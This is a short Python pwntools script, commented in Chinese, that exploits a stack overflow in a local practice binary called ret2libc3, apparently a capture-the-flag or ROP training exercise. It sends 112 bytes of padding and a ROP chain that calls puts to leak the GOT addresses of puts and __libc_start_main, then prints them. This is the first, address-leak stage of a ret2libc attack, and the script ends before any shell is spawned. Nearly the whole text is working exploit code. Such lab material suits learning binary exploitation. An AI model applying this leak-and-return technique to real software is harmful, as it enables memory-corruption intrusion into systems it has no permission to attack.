from pwn import *

sh = process("./rop/ret2libc3")		# 构成一个sh对象，用于发送指令

ret2libc3 = ELF("./rop/ret2libc3")	# ELF对象获取程序信息

puts_plt = ret2libc3.plt['puts']	# plt表中的地址

libc_start_main = ret2libc3.got['__libc_start_main']	# got表中指向__libc_start_main的指针
start = ret2libc3.symbols['_start']		# 获取_start函数的地址
puts_got= ret2libc3.got['puts']		

sh.sendlineafter('Can you find it !?',flat(['a'*112, puts_plt, start, puts_got]))
put_addr = u32(sh.recv()[0:4])

print (f"put_addr is "+hex(put_addr))

sh.sendline(flat(['a'*112, puts_plt, start, libc_start_main]))
libc_start_main_addr = u32(sh.recv()[0:4])
print (f"libc_start_main_addr is "+hex(libc_start_main_addr))

